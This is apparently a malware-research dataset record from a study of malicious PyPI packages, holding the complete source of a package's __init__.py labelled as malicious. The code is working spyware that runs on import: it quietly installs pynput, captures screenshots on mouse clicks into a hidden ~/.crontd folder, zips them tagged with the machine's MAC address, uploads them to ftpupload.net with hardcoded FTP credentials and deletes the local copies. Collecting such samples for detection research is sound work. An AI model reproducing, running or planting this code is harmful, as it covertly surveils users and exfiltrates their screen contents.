[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/systemdemon-2.9-py3-none-any/systemdemon/__init__.py",
    "malicious_code": "import re, uuid\nimport random\nimport time\nimport urllib.request\nfrom ftplib import FTP\nimport socket\nfrom pathlib import Path\nfrom os import path\nimport glob\nfrom zipfile import ZipFile\nimport os\ntry:\n    import pynput\nexcept:\n    os.system(\"pip install pynput -q -q -q\")\nfrom pynput import mouse\nfrom PIL import ImageGrab\niden=':'.join(re.findall('..', '%012x' % uuid.getnode()))\nt = time.localtime()\ntimestamp = time.strftime('%b-%d-%Y', t)\nIPAddr = \"ourobs\"\nPATH = '/home/' + os.getlogin() + '/.crontd/'\ndef shot():\n    isExist = os.path.exists(PATH)\n    if not isExist:\n        os.makedirs(PATH)\n    hellarea = random.randint(0, 100)\n    hellar = str(hellarea)\n    snapshot = ImageGrab.grab()\n    BACKUP_NAME = (hellar + \"-shots.png\")\n    snapshot.save(PATH + '/' + BACKUP_NAME)\n    count()\ndef hel():\n    hellarea = random.randint(0, 100)\n    hellar = str(hellarea)\n    output_zip_path = '/home/' + os.getlogin() + '/.crontd/' + iden +'-'+IPAddr+ '-' + timestamp + '-' + hellar + '-' + 'clickshots.zip'\n    file1_path='/home/'+os.getlogin()+'/.crontd/'\n    with ZipFile(output_zip_path, 'w') as zipObj:\n       for file in glob.glob(file1_path + \"*.png\"):\n                zipObj.write(file, path.basename(path.normpath(file)))\n    try:\n        host = socket.gethostbyname(\"www.google.com\")\n        s = socket.create_connection((host, 80), 2)\n        file_path = Path(output_zip_path)\n        with FTP('ftpupload.net', 'epiz_33429346', 'uhoU6bJvPpJUiTM') as ftp, open(file_path, 'rb') as file:\n            ftp.storbinary(f'STOR {file_path.name}', file)\n            os.remove(file_path)\n        rem()\n    except:\n        exit()\n    return False\ndef count():\n    dir_path = PATH\n    count = 0\n    for path in os.listdir(dir_path):\n        if os.path.isfile(os.path.join(dir_path, path)):\n            count += 1\n    if count == 7:\n        hel()\n    else:\n        foo()\ndef rem():\n    directory = PATH\n    files_in_directory = os.listdir(directory)\n    filtered_files = [file for file in files_in_directory if file.endswith(\".png\")]\n    for file in filtered_files:\n        path_to_file = os.path.join(directory, file)\n        os.remove(path_to_file)\n    foo()\ndef foo():\n    i = 0\n    while True:\n        i += 1\n        if i==4:\n            i=0\n            shot()\n        else:\n            print()\n        yield\ndef on_click(x, y, button, pressed, foo):\n    if pressed:\n        next(foo)\nfrom functools import partial\nbar = partial(on_click, foo=foo())\nwith mouse.Listener(on_click=bar) as listener:\n    listener.join()\n"
  }
]